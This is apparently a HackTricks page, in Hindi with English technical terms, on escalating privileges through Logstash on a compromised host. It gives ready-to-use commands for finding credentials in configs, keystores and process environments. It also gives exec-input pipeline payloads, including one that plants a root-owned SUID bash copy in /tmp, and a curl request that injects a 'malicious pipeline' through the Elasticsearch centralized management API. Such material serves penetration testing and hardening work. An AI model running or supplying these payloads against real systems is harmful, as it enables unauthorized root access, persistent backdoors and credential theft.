# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash का उपयोग **logs को gather, transform और dispatch करने** के लिए किया जाता है, जिसे **pipelines** नामक system के माध्यम से संचालित किया जाता है। ये pipelines **input**, **filter** और **output** stages से बने होते हैं।<sup>[[4]](#references)</sup> जब Logstash किसी compromised machine पर चलता है, तब एक interesting aspect सामने आता है।

### Pipeline Configuration

Debian और RPM package installs पर, pipelines को **/etc/logstash/pipelines.yml** के माध्यम से configure किया जाता है, जिसमें pipeline configurations के locations की सूची होती है; अन्य distributions में `pipelines.yml` को Logstash की `path.settings` directory में रखा जाता है।<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
यह फ़ाइल बताती है कि pipeline configurations वाली **.conf** फ़ाइलें कहाँ स्थित हैं। **Elasticsearch output** का उपयोग करते समय उसकी `user`/`password`, `cloud_auth`, या `api_key` settings की जाँच करें; account के effective privileges Elasticsearch पर निर्भर करते हैं। `path.config` glob उस pipeline के लिए matching हर फ़ाइल को load करता है।<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

यदि Logstash को `pipelines.yml` के बजाय `-f <directory>` के साथ start किया जाता है, तो `-f` को precedence मिलती है और उस directory के अंदर की **सभी फ़ाइलें lexicographical order में concatenate होकर एक single config के रूप में parse की जाती हैं**।<sup>[[6]](#references)[[7]](#references)</sup> इससे 2 offensive implications उत्पन्न होते हैं:

- `000-input.conf` या `zzz-output.conf` जैसी रखी गई फ़ाइल final pipeline के assemble होने के तरीके को बदल सकती है
- कोई malformed फ़ाइल combined config की validation को fail कर सकती है; reload के दौरान Logstash previous pipeline को बनाए रखता है, इसलिए auto-reload पर निर्भर करने से पहले payloads को validate करें।<sup>[[1]](#references)</sup>

### Compromised Host पर Fast Enumeration

जिस box पर Logstash installed हो, वहाँ जल्दी से जाँच करें:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
यह भी जाँचें कि local monitoring API तक पहुँचा जा सकता है या नहीं। डिफ़ॉल्ट रूप से यह **127.0.0.1:9600** पर bind होता है, जो host पर पहुँच हासिल करने के बाद आमतौर पर पर्याप्त होता है।<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
ये endpoints pipeline IDs और settings, runtime metrics, तथा config-reload success/failure counters expose करते हैं, जिससे यह confirm करने में मदद मिलती है कि कोई change स्वीकार किया गया था या नहीं।<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

यदि recovered credential **Elasticsearch** को target करता है, तो [Elasticsearch के बारे में इस अन्य page](../../network-services-pentesting/9200-pentesting-elasticsearch.md) को देखें।

### Writable Pipelines के माध्यम से Privilege Escalation

Privilege escalation का प्रयास करने के लिए, पहले उस user की पहचान करें जिसके तहत Logstash service वास्तव में चल रही है; यह assume न करें कि वह root या **logstash** user है। सुनिश्चित करें कि आप **इनमें से एक** criterion को पूरा करते हैं:

- किसी pipeline **.conf** file पर **write access** हो **या**
- **/etc/logstash/pipelines.yml** file में wildcard का उपयोग हो, और आप target folder में write कर सकते हों।<sup>[[6]](#references)[[7]](#references)</sup>

इसके अतिरिक्त, **इनमें से एक** condition पूरी होनी चाहिए:

- Logstash service को restart करने की capability हो **या**
- **/etc/logstash/logstash.yml** file में **config.reload.automatic: true** set हो।<sup>[[1]](#references)[[15]](#references)</sup>

Configuration में wildcard होने पर, ऐसा file बनाना जो इस wildcard से match करे, command execution की अनुमति देता है।<sup>[[7]](#references)[[9]](#references)</sup> उदाहरण के लिए:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
यहाँ, **interval** सेकंड में execution frequency निर्धारित करता है। दिए गए उदाहरण में, **whoami** command हर 120 सेकंड में चलती है और उसका output **/tmp/output.log** में भेजा जाता है।<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml** में **config.reload.automatic: true** होने पर, Logstash बिना restart की आवश्यकता के नई या संशोधित pipeline configurations को अपने-आप detect और apply करेगा।<sup>[[1]](#references)[[15]](#references)</sup> यदि कोई wildcard नहीं है, तो मौजूदा configurations में फिर भी modifications किए जा सकते हैं, लेकिन disruptions से बचने के लिए सावधानी बरतने की सलाह दी जाती है।

### अधिक विश्वसनीय Pipeline Payloads

`exec` input plugin वर्तमान releases में अभी भी काम करता है और इसके लिए या तो `interval` या `schedule` आवश्यक होता है। यह Logstash JVM को **forking** करके execute करता है, इसलिए यदि memory कम हो, तो आपका payload चुपचाप चलने के बजाय `ENOMEM` के साथ fail हो सकता है।<sup>[[9]](#references)</sup>

जब service के पास root-owned SUID file बनाने के पर्याप्त privileges हों, तो एक practical privilege-escalation payload ऐसा होता है जो एक durable artifact छोड़ता है:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
यदि आपके पास restart करने के अधिकार नहीं हैं, लेकिन process को signal भेज सकते हैं, तो Logstash Unix-जैसे systems पर **SIGHUP** से trigger होने वाले reload का भी समर्थन करता है:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
ध्यान रखें कि हर plugin reload-friendly नहीं होता। उदाहरण के लिए, **stdin** input automatic reload को रोकता है, इसलिए यह न मानें कि `config.reload.automatic` हमेशा आपके बदलावों को लागू कर देगा।<sup>[[1]](#references)</sup>

### Logstash से Secrets चुराना

केवल code execution पर ध्यान केंद्रित करने से पहले, उस data को collect करें जिस तक Logstash की पहले से पहुंच है:

- Credentials `elasticsearch {}` outputs, `http_poller` URLs/settings, JDBC inputs या cloud-related settings में दिखाई दे सकते हैं; ये plugins ऐसे credential fields expose करते हैं जिन्हें खोजना उपयोगी है।<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings **`/etc/logstash/logstash.keystore`** या किसी अन्य `path.settings` directory में हो सकती हैं।<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password **`LOGSTASH_KEYSTORE_PASS`** के माध्यम से दिया जा सकता है, और RPM/DEB installs service environment variables को **`/etc/sysconfig/logstash`** से source करते हैं।<sup>[[10]](#references)</sup>
- `${VAR}` के साथ environment-variable expansion Logstash startup पर resolve होता है, इसलिए service environment की जांच करना उपयोगी है।<sup>[[14]](#references)</sup>

Useful checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
यह जाँचने योग्य है क्योंकि **CVE-2023-46672** से पता चला कि, कुछ विशेष परिस्थितियों में, Logstash ने अपनी logs में sensitive information रिकॉर्ड की, जिसमें उसके keystore में stored secrets और configuration से referenced secrets भी शामिल थे; यदि ये परिस्थितियाँ लागू हो सकती हैं, तो पुराने Logstash logs और `journald` entries की समीक्षा करें।<sup>[[3]](#references)</sup>

### Centralized Pipeline Management का दुरुपयोग

कुछ environments में host स्थानीय `.conf` files पर बिल्कुल निर्भर **नहीं** होता। यदि **`xpack.management.enabled: true`** configured है, तो Logstash Elasticsearch/Kibana से centrally managed pipelines प्राप्त कर सकता है, और इस mode को enable करने के बाद local pipeline configs अब source of truth नहीं रहतीं।<sup>[[2]](#references)</sup>

इसका अर्थ है कि एक अलग attack path मौजूद है:

1. Local Logstash settings, keystore या logs से Elastic credentials प्राप्त करें।<sup>[[3]](#references)[[10]](#references)</sup>
2. जाँचें कि account के पास **`manage_logstash_pipelines`** cluster privilege है या नहीं।<sup>[[16]](#references)</sup>
3. एक centrally managed pipeline create या replace करें, ताकि Logstash host अपने अगले poll interval पर आपका payload execute करे।<sup>[[2]](#references)[[16]](#references)</sup>

इस feature के लिए उपयोग की जाने वाली Elasticsearch API है:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
यह विशेष रूप से तब उपयोगी होता है जब local files read-only हों, लेकिन Logstash पहले से ही pipelines को remotely fetch करने के लिए registered हो।<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Config फ़ाइल को Reload करना](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Centralized Pipeline Management को Configure करना](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash Pipeline बनाना](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash Directory Layout](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Multiple Pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Command Line से Logstash चलाना](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: APIs के साथ Logstash की Monitoring करना](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secure settings के लिए Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Environment variables का उपयोग करना](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash pipeline बनाना या Update करना](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipelines के लिए settings प्राप्त करना](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipelines के लिए statistics प्राप्त करना](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
